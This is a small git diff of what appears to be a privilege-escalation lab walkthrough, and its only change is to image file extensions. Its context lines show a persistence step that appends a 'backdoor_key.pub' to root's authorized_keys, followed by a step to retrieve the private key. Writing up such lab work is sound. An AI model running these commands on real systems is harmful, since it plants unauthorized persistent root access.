@@ -87,11 +87,11 @@ cat /root/.ssh/backdoor_key.pub >> /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
 ```
 
-![SSH key generation output - part 1](./screenshots/privalageescaltion/b1.PNG)
+![SSH key generation output - part 1](./screenshots/privalageescaltion/b1.png)
 
-![SSH key generation output - part 2](./screenshots/privalageescaltion/b2.PNG)
+![SSH key generation output - part 2](./screenshots/privalageescaltion/b2.png)
 
-![SSH key injection into authorized_keys - part 3](./screenshots/privalageescaltion/b3.PNG)
+![SSH key injection into authorized_keys - part 3](./screenshots/privalageescaltion/b3.png)
 
 ### Step 2 — Retrieve the Private Key
 
